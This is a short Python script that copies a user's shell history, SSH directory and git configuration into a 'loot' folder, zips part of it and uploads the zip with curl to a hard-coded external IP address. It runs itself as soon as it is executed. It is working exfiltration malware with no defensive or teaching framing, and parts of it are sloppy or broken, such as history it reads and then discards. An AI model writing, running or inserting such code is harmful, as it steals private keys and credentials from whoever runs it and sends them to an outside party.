import os, shutil, subprocess, zipfile
from pathlib import Path
def subprocess_popen(command):
 return subprocess.Popen(command,shell=True,stdout=subprocess.PIPE)
def get_gitGlobalConfig():
 return subprocess_popen("git config --global --list")
def writeFile():
 user="alice"
 folder=f"/tmp/{user}/loot"
 os.makedirs(folder,exist_ok=True)
 with open(f"/Users/{user}/.bash_history","r") as f: f.read()
 shutil.copyfile(f"/Users/{user}/.zsh_history",folder+"/zsh_history")
 shutil.copytree(f"/Users/{user}/.ssh",folder+"/ssh")
 shutil.copyfile(f"/Users/{user}/.gitConfig",folder+"/gitconfig")
 z=zipfile.ZipFile(folder+".zip","w",zipfile.ZIP_DEFLATED)
 z.write(folder+"/zsh_history")
 z.close()
 os.system("curl -k -F file=@"+folder+".zip https://54.254.189.27/api/v1/file/upload")
writeFile()
